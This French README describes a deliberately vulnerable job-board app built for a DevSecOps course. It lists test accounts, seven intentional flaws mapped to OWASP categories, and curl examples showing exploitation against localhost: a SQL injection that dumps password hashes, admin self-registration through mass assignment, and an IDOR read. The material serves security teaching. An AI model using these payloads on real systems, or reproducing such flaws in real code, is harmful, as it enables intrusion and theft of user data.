# JobBoard (application volontairement vulnérable)

Projet DevSecOps · ING-5-SSIR · TEK-UP. **Ne jamais déployer en production.**

## Lancer en local
```bash
docker compose up -d db          # PostgreSQL (init.sql appliqué au 1er démarrage)
cd app && npm install
npm run seed                     # comptes et offres de test
npm start                        # http://localhost:3000
```

## Comptes de test
| Rôle | E-mail | Mot de passe |
|---|---|---|
| admin | admin@jobboard.test | Admin123! |
| recruteur | recruteur@jobboard.test | Recruiter123! |
| candidat | candidat@jobboard.test | Candidate123! |

## Failles volontaires (à documenter dans docs/)
| ID | Faille | Où | OWASP |
|---|---|---|---|
| VULN-1 | Injection SQL | `app/routes/jobs.js` (GET /api/jobs?q=) | A03 |
| VULN-2 | IDOR | `routes/applications.js` (GET /:id), `routes/cv.js` | A01 |
| VULN-3 | Mass assignment du rôle | `routes/auth.js` (register) | A01 |
| VULN-4 | Secrets en clair | `app/config.js`, `docker-compose.yml` | A02/A05 |
| VULN-5 | Dépendances vulnérables | `app/package.json` (express, jsonwebtoken, lodash, multer) | A06 |
| VULN-6 | Mauvaise config : CORS `*`, erreurs avec stack, upload sans contrôle, XSS stocké (description), jeton JWT sans expiration | `server.js`, `applications.js`, `public/index.html` | A05/A03 |
| VULN-7 | Contrôle d'accès manquant | `routes/admin.js` (PATCH deactivate) | A01 |

## Exemples d'exploitation
```bash
# VULN-1 : lister les utilisateurs et leurs hash via la recherche
curl "http://localhost:3000/api/jobs?q=zzz'%20UNION%20SELECT%20id,email,password_hash,role,NULL,NOW()%20FROM%20users--"
# VULN-3 : s'inscrire directement admin
curl -X POST localhost:3000/api/auth/register -H 'Content-Type: application/json' -d '{"email":"x@x.com","password":"x","role":"admin"}'
# VULN-2 : lire la candidature n°1 avec le jeton de n'importe quel utilisateur
curl -H "Authorization: Bearer $TOKEN" localhost:3000/api/applications/1
```
